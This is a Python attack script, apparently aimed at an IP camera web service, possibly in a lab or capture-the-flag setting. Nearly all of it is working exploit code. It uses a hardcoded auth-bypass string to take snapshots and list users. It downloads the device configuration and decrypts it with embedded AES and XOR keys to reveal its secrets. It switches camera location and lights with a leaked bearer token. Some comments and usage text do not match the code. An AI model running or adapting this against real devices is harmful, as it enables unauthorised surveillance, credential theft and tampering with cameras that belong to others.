import requests

from Crypto.Cipher import AES
from itertools import cycle
import sys

auth = "YWRtaW46MTEK"  # base64 for "admin:1111"
authorization = {
    "Authorization": "Bearer 0c497d24da14cde5f5b947f7920d4df20189d9b1ad3302b9b31afd1ec1918f1b"
}  # token found in ENV


# Decryption functions
def xore(data, key=b"\x73\x8B\x55\x44"):
    """XOR the data with a repeating key."""
    return bytes(a ^ b for a, b in zip(data, cycle(key)))


def decrypt(ciphertext, hex_key="279977f62f6cfd2d91cd75b889ce0c9a"):
    """Decrypt the configuration file."""
    key = bytes.fromhex(hex_key)
    ciphertext = ciphertext[16:]  # Skip the 16-byte header
    cipher = AES.new(key, AES.MODE_ECB)
    plaintext = cipher.decrypt(ciphertext)
    plaintext = plaintext.rstrip(b"\0")  # Remove padding
    return xore(plaintext)


# Main attack function
def attack(target, action):
    """Perform the specified attack on the target server."""
    url = f"http://{target}"

    if action == "screenshot":
        endpoint = "/onvif-http/snapshot"
        response = requests.get(f"{url}{endpoint}?auth={auth}")
        if response.status_code == 200:
            with open("screenshot.png", "wb") as f:
                f.write(response.content)
            print("Screenshot saved to screenshot.png")
        else:
            print(f"Failed to get screenshot, get status {response.status_code}")

    elif action == "users":
        endpoint = "/Security/users"
        response = requests.get(f"{url}{endpoint}?auth={auth}")
        if response.status_code == 200:
            print("Users:\n", response.text)
        else:
            print("Failed to get users")

    elif action == "config":
        endpoint = "/System/configurationFile"
        response = requests.get(f"{url}{endpoint}?auth={auth}")
        if response.status_code == 200:
            decrypted = decrypt(response.content)
            print("Decrypted Config:\n", decrypted.decode("utf-8", errors="ignore"))
        else:
            print("Failed to get config")

    elif action == "ping":
        endpoint = "/ping"
        response = requests.get(f"{url}{endpoint}?auth={auth}")
        if response.status_code == 200:
            print(response.content)
        else:
            print("Failed to get config")

    elif action == "location-corridor":
        endpoint = "/location"
        response = requests.get(f"{url}{endpoint}?auth={auth}&location=corridor")
        if response.status_code == 200:
            print(response.content)
        else:
            print("Failed to switch camera")

    elif action == "location-room1":
        endpoint = "/location"
        response = requests.get(f"{url}{endpoint}?auth={auth}&location=room1")
        if response.status_code == 200:
            print(response.content)
        else:
            print("Failed to switch camera")

    elif action == "light-on":
        endpoint = "/light"
        response = requests.get(f"{url}{endpoint}?auth={auth}&light=on", headers=authorization)
        if response.status_code == 200:
            print("Camera next done")
        else:
            print("Failed to switch camera")

    elif action == "light-off":
        endpoint = "/light"
        response = requests.get(f"{url}{endpoint}?auth={auth}&light=off", headers=authorization)
        if response.status_code == 200:
            print("Camera next done")
        else:
            print("Failed to switch camera")

    else:
        print(
            "Invalid action. Choose 'screenshot', 'users', 'config', 'ping', 'next', 'light-on', 'light-off'."
        )


# Command-line interface
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python attack.py <target> <action>")
        print("Action: screenshot, users, config, ping, next, light-on, light-off")
        sys.exit(1)

    target = sys.argv[1]
    action = sys.argv[2].lower()
    attack(target, action)
